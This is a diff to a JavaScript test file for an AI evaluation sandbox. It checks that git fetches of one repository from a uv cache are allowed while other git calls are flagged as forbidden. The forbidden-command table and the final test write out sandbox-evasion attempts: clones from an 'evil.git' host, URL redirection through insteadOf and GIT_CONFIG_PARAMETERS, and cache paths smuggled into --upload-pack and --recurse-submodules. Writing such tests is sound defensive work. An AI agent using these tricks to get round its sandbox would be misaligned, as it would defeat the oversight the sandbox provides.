@@ -1,4 +1,4 @@
-import { describe, it } from 'node:test';
+import { afterEach, beforeEach, describe, it } from 'node:test';
 import assert from 'node:assert/strict';
 import { spawnSync } from 'node:child_process';
 import {
@@ -212,58 +212,96 @@ describe('simulated remotes', () => {
 
 describe('uv cache git passthrough', () => {
   const serena = 'https://github.com/oraios/serena';
+  const gitCache = join(root, 'evals', '.uv-cache', 'git-v1');
+  const made = [];
 
-  function localRemote() {
-    const remote = join(h.base, 'serena-remote');
-    mkdirSync(remote, { recursive: true });
-    spawnSync('git', ['init', '-q', remote]);
-    spawnSync('git', ['-C', remote, 'commit', '-q', '--allow-empty', '-m', 'x'], {
-      env: {
-        ...process.env,
+  const savedWritable = process.env.EVAL_SANDBOX_WRITABLE;
+
+  beforeEach(() => {
+    mkdirSync(gitCache, { recursive: true });
+    process.env.EVAL_SANDBOX_WRITABLE = [savedWritable, gitCache].filter(Boolean).join(':');
+  });
+
+  afterEach(() => {
+    if (savedWritable === undefined) delete process.env.EVAL_SANDBOX_WRITABLE;
+    else process.env.EVAL_SANDBOX_WRITABLE = savedWritable;
+    for (const dir of made.splice(0)) rmSync(dir, { recursive: true, force: true });
+  });
+
+  function repo(dir, { commit = false } = {}) {
+    mkdirSync(dir, { recursive: true });
+    made.push(dir);
+    spawnSync('git', ['init', '-q', dir]);
+    if (commit) {
+      const id = {
         GIT_AUTHOR_NAME: 't',
         GIT_AUTHOR_EMAIL: 't@t',
         GIT_COMMITTER_NAME: 't',
         GIT_COMMITTER_EMAIL: 't@t',
-      },
-    });
-    return remote;
-  }
-
-  function cacheDir() {
-    const dir = join(h.base, '.uv-cache', 'git-v1', 'db');
-    mkdirSync(dir, { recursive: true });
-    spawnSync('git', ['init', '-q', dir]);
+      };
+      spawnSync('git', ['-C', dir, 'commit', '-q', '--allow-empty', '-m', 'x'], {
+        env: { ...process.env, ...id },
+      });
+    }
     return dir;
   }
 
-  it('fetching the Serena repo from inside the uv git cache reaches real git, not the refusal', async () => {
-    const remote = localRemote();
-    const dir = cacheDir();
+  function cacheRepo() {
+    return repo(join(gitCache, `test-${process.pid}-${made.length}`));
+  }
+
+  it('fetching the Serena repo inside the uv git cache is passed to real git, not refused', async () => {
+    const dir = cacheRepo();
     h.useFakeClaude({
-      FAKE_CLAUDE_RUN: `cd '${dir}' && git config url.${remote}.insteadOf ${serena} && git fetch --force --update-head-ok ${serena} +HEAD:refs/remotes/o/HEAD`,
+      FAKE_CLAUDE_RUN: `cd '${dir}' && git fetch --force --update-head-ok ${serena} +HEAD:refs/remotes/o/HEAD; true`,
     });
     const r = await h.call({ trialId: 'u1', noCache: true });
     assert.deepEqual(r.metadata.sandbox.forbiddenCalls, []);
+    assert.doesNotMatch(r.output, /eval sandbox/);
+  });
+
+  it('a local clone of a uv cache path runs real git', async () => {
+    const src = repo(join(gitCache, `test-${process.pid}-src`), { commit: true });
+    h.useFakeClaude({
+      FAKE_CLAUDE_RUN: `git clone --local --no-checkout '${src}' "$TMPDIR/checkout" && echo CLONED`,
+    });
+    const r = await h.call({ trialId: 'u3', noCache: true });
+    assert.deepEqual(r.metadata.sandbox.forbiddenCalls, []);
+    assert.match(r.output, /CLONED/);
   });
 
   const forbidden = {
     'a push from inside the uv cache': 'cd "$C" && git push origin HEAD',
-    'a push naming the cache path as an argument':
-      'git push origin HEAD --push-option=/x/.uv-cache/git-v1/y',
     'git -C into the cache': 'git -C "$C" push origin HEAD',
     'a Serena fetch from outside the uv cache': `git fetch ${serena}`,
+    'a Serena fetch from a lookalike dir outside the cache': `L="$TMPDIR/ws/.uv-cache/git-v1/evil"; mkdir -p "$L"; git init -q "$L"; cd "$L" && git fetch ${serena}`,
     'a Serena fetch with a second remote': `cd "$C" && git fetch ${serena} https://example.com/evil.git`,
     'a Serena fetch with -c config': `cd "$C" && git -c url.x.insteadOf=${serena} fetch ${serena}`,
-    'a clone from a remote': 'git clone https://example.com/evil.git /tmp/x',
+    'a Serena fetch from a cache repo whose config rewrites URLs': `cd "$C" && git config url.file:///x.insteadOf ${serena} && git fetch ${serena}`,
+    'a clone from a remote': 'git clone https://example.com/evil.git "$TMPDIR/x"',
+    'a clone hiding the cache path in --upload-pack':
+      'git clone --upload-pack=/x/.uv-cache/git-v1/up "$C" "$TMPDIR/x"',
+    'a clone hiding the cache path in --recurse-submodules':
+      'git clone --recurse-submodules=/x/.uv-cache/git-v1/ "$C" "$TMPDIR/x"',
   };
   for (const [name, cmd] of Object.entries(forbidden)) {
     it(`${name} is still a forbidden call`, async () => {
-      const dir = cacheDir();
+      const dir = cacheRepo();
       h.useFakeClaude({ FAKE_CLAUDE_RUN: `C='${dir}'; ${cmd}; true` });
       const r = await h.call({ trialId: 'uf', noCache: true });
       assert.ok(r.metadata.sandbox.forbiddenCalls.length >= 1, r.output);
     });
   }
+
+  it('GIT_CONFIG_PARAMETERS cannot redirect the Serena fetch to another remote', async () => {
+    const dir = cacheRepo();
+    const evil = repo(join(h.base, 'evil-remote'), { commit: true });
+    h.useFakeClaude({
+      FAKE_CLAUDE_RUN: `cd '${dir}' && GIT_CONFIG_PARAMETERS="'url.${evil}.insteadOf=${serena}'" git fetch ${serena} 2>&1; true`,
+    });
+    const r = await h.call({ trialId: 'u4', noCache: true });
+    assert.ok(!r.output.includes(evil), r.output);
+  });
 
   it('the profile lets this trial write its Claude tmp dir and no sibling', darwinOnly, () => {
     const sb = createTrialSandbox('claudetmp');
